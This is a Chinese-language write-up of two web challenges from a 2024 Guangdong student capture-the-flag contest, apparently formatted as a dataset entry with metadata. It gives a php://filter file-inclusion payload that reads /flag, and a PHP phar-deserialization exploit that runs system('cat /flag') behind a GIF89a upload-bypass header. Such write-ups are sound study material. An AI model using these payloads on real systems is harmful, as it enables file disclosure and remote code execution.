---
title: 第三届广东省大学生网络攻防竞赛WriteUp
contest: 第三届广东省大学生网络攻防竞赛
year: 2024
difficulty: medium
vuln_type: web_unknown
tags: [广东大学生网安赛, php://filter文件包含, phar反序列化, www.tar.gz备份, File类__construct, convert.iconv.UTF-8.UCS-2]
attack_chain: web1:文件包含php://filter/convert.iconv.UTF-8.UCS-2/resource=/flag→web2:目录扫描www.tar.gz→审计反序列化+phar生成→setMetadata(File类__construct触发__destruct)
key_payload: "php://filter/convert.iconv.UTF-8.UCS-2/resource=/flag;www.tar.gz;phar生成:phar->setStub('GIF89a'.'<?php __HALT_COMPILER(); ? >');$phar->setMetadata(new File())"
one_liner: 第三届广东大学生网安赛：php://filter文件包含+phar反序列化
lesson: phar协议反序列化是PHP文件上传常见漏洞链
quality: medium
---

# 第三届广东省大学生网络攻防竞赛WriteUp

**赛事**：第三届广东省大学生网络攻防竞赛（2024）

**WEB-1 消失的flag**：
- flag隐藏在文件里
- 构造文件包含：
  ```
  /?file=php://filter/convert.iconv.UTF-8.UCS-2/resource=/flag
  ```

**WEB-2 unserialize_web**：
- 题目给反序列化源码 + 文件上传功能
- 目录扫描发现 `www.tar.gz` 备份文件
- 代码审计 + phar反序列化

**File类**：
```php
<?php
class File {
    public $val1;
    public $val2;
    public $val3;
    public function __construct(){
        $this->val1 = 'file';
        $this->val2 = 'exists';
        $this->val3 = "system('cat /flag');";
    }
}
```

**Phar生成EXP**：
```php
<?php
$a = new File();
$phar = new Phar('exp.phar');
$phar->startBuffering();
$phar->setStub('GIF89a'.'<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($a);
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
```

**核心技术**：
- php://filter/convert.iconv.UTF-8.UCS-2 文件包含（编码转换）
- 目录扫描www.tar.gz源码泄露
- Phar协议反序列化（setMetadata触发__destruct）
- GIF89a绕过上传头检测

**质量评估**：中（两题payload完整）
